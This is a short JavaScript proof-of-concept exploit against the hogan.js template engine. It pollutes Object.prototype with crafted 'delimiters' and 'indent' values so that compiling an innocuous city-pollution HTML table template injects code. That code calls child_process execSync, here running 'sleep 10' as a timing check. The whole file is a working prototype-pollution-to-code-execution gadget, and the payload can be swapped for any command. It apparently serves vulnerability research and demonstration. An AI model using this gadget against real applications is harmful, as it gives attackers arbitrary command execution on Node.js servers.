const hogan = require("hogan.js");


/* Polluted Payload*/
// inject property to root prototype
Object.prototype.delimiters = 'tr \n';
Object.prototype.indent = '/*"));return process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()//*/';

/* Exported Function Call*/
const TEMPLATE = `
<table border="1">
  <thead>
    <tr>
      <th>City</th>
      <th>Pollution index</th>
      <th>Year</th>
    </tr>
  </thead>
  <tbody>
  {{#data}}
    <tr>
      <td>{{city}}</td>
      <td>{{pollution}}</td>
      <td>{{year}}</td>
    </tr>
  {{/data}}
  {{^data}}
    Nothing found
  {{/data}}
  </tbody>
</table>
`;

const template = hogan.compile(TEMPLATE);
template.render();

